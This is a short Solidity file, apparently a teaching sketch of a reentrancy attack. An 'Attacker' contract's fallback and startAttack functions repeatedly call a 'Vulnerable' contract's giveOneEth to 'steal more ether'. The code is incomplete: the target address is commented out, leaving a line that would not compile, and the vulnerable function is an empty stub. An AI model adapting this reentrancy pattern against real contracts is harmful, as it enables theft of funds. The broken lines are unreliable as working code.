// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Vulnerable {
    function giveOneEth() public payable {}
}

contract Attacker {
    uint stolenEther = 0;
    //  Need to deploy Vulnerable contract and add its address here 
    //  Vulnerable dc = Vulnerable(0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99);
    Vulnerable dc = Vulnerable();


    constructor() payable {
    }

    receive() payable external {}

    fallback() external payable {
        require(stolenEther <= 10, "you've taken enough Ether");
        // call giveOneEth to steal more ether
        stolenEther += 1;
        dc.giveOneEth();
    }

    function startAttack() public payable {
        require(stolenEther <= 10, "you've taken enough Ether");
        // call giveOneEth to steal more ether
        stolenEther += 1;
        dc.giveOneEth();
    }
}
